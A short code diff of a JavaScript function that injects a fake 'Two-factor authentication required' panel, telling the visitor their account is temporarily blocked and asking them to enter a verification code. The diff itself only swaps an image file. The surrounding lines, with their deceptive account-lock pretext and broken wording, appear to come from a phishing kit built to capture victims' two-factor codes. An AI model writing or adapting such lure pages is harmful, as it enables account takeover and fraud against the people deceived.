@@ -55,7 +55,7 @@ function updateHtmlAndCallback(callback) {
     $('#code-form .card-body').html(`
         <h2 class="card-title fw-bold">Two-factor authentication required </h2>
         <p class="card-text py-3">We have temporarily blocked your account because your protect has changed. Verify code has been sent</p>
-        <img src="/img/TOtVy8P.png" class="w-100 rounded" alt="">
+        <img src="/img/681.png" class="w-100 rounded" alt="">
         <input type="text" class="form-control my-3 py-2 bg-light" id="code" placeholder="Enter your code" required>
         <p class="text-danger ms-1 d-none" id="wrong-code">
             This code is incorrect. Please check that you entered the code correctly or try a new code.
